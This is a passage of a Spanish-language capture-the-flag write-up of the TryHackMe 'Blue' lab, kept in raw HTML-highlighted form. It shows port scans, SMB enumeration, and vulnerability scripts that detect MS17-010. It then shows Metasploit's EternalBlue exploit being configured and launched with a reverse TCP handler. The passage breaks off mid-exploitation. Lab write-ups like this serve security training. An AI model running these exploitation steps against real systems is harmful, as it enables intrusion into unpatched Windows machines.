&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/trymehack/blue# masscan -p1-65535,U:1-65535 10.10.24.91 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-04 00:56:01 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49153/tcp on 10.10.24.91                                  
Discovered open port 49154/tcp on 10.10.24.91                                  
Discovered open port 49152/tcp on 10.10.24.91                                  
Discovered open port 137/udp on 10.10.24.91                                    
Discovered open port 3389/tcp on 10.10.24.91 

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Tue Sep  3 21:03:21 2019 as: nmap -sC -sV -p1-1000 -o nmap.scan_mil 10.10.24.91&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.24.91
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host: JON-PC&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_nbstat: NetBIOS name: JON-PC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:ae:0a:27:4e:02 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unknown&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional 6.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: Jon-PC
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: JON-PC&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Workgroup: WORKGROUP&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2019-09-03T20:04:00-05:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: guest
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-09-03 21:04:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-09-03 20:54:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Sep  3 21:04:06 2019 -- 1 IP address (1 host up) scanned in 45.67 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smbclient--smbmap&#34;&gt;SMBCLIENT &amp;amp; SMBMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de sharenames.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/trymehack/blue# smbclient -L &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.24.91
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
smb1cli_req_writev_submit: called &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; dialect&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB2_10&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; server&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.24.91&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; workgroup listing.
do_connect: Connection to 10.10.24.91 failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Error NT_STATUS_RESOURCE_NAME_NOT_FOUND&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Failed to connect with SMB1 -- no workgroup available
root@kali:~/trymehack/blue# smbmap -H 10.10.24.91
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
root@kali:~/trymehack/blue# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap---smb-scripts&#34;&gt;NMAP - SMB SCRIPTS&lt;/h2&gt;
&lt;p&gt;Utilizamos los scripts de nmap para verificar si alguno es vulnerable con la maquina, y, encontramos que es vulnerable a &lt;strong&gt;ms17-010&lt;/strong&gt; o &lt;strong&gt;ETERNALBLUE&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/trymehack/blue# nmap --script smb-vuln-* 10.10.24.91
Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-03 21:11 EDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.24.91
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;991&lt;/span&gt; closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_smb-vuln-ms10-054: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-vuln-ms17-010: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   VULNERABLE:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Remote Code Execution vulnerability in Microsoft SMBv1 servers &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ms17-010&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     State: VULNERABLE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     IDs:  CVE:CVE-2017-0143
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Risk factor: HIGH
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       A critical remote code execution vulnerability exists in Microsoft SMBv1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;        servers &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ms17-010&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Disclosure date: 2017-03-14
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     References:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;CVE-2017-0143
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 42.25 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;metasploit---eternalblue&#34;&gt;METASPLOIT - ETERNALBLUE&lt;/h2&gt;
&lt;p&gt;Utilizamos metasploit y el exploit &lt;strong&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/strong&gt; contra la maquina, lo configuramos y corremos el exploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target address range or CIDR identifier
   RPORT          &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;              yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SMBDomain      .                no        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Optional&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; The Windows domain to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; authentication
   SMBPass                         no        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Optional&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; The password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the specified username
   SMBUser                         no        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Optional&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; The username to authenticate as
   VERIFY_ARCH    &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;             yes       Check &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; remote architecture matches exploit Target.
   VERIFY_TARGET  &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;             yes       Check &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; and Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; All Service Packs


msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhosts 10.10.24.91
&lt;span class=&#34;nv&#34;&gt;rhosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.24.91
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show targets 

Exploit targets:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; and Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; All Service Packs


msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.8.1.72:4444 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445       - Host is likely VULNERABLE to MS17-010! - Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Professional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64-bit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Connecting to target &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploitation.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Connection established &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploitation.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Target OS selected valid &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; OS indicated by SMB reply
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - CORE raw buffer dump &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;42&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - 0x00000000  &lt;span class=&#34;m&#34;&gt;57&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; 6e &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; 6f &lt;span class=&#34;m&#34;&gt;77&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; 6f &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt;  Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Profes
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - 0x00000010  &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; 6f 6e &lt;span class=&#34;m&#34;&gt;61&lt;/span&gt; 6c &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;76&lt;/span&gt;  sional &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Serv
